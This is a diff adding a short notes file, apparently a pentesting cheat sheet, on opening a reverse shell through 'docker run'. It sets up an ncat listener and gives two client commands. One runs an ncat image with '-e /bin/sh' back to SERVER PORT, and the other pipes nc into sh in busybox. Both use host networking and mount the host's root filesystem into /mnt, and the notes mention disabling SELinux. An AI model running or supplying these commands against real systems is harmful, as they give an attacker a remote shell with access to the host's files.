@@ -1,0 +1,23 @@
+Reverse shell from docker run
+-------------------------------------
+* https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/
+* https://docs.docker.com/network/network-tutorial-host/
+
+Notes:
+------------
+* Tested on CentOS w/ SElinux off (ie: `setenforce 0`)
+* --network host, networking standalone containers which bind directly to the Docker host’s network, with no network isolation
+* -t, --tty Allocate a pseudo-TTY
+* --rm Automatically remove the container when it exits
+* -v, --volume Bind mount a volume (mount the hosts root filesystem into /mnt)
+
+[server]# ncat -vl PORT
+
+Run ncat Docker Image
+------------------------------
+	[client]# docker run --network host --rm -v /:/mnt raesene/ncat SERVER PORT -e /bin/sh
+
+Run Busybox Image, execute nc
+---------------------------------
+	[client]# docker run -t --network host --rm -v /:/mnt busybox /bin/sh -c "nc SERVER PORT | sh"
+
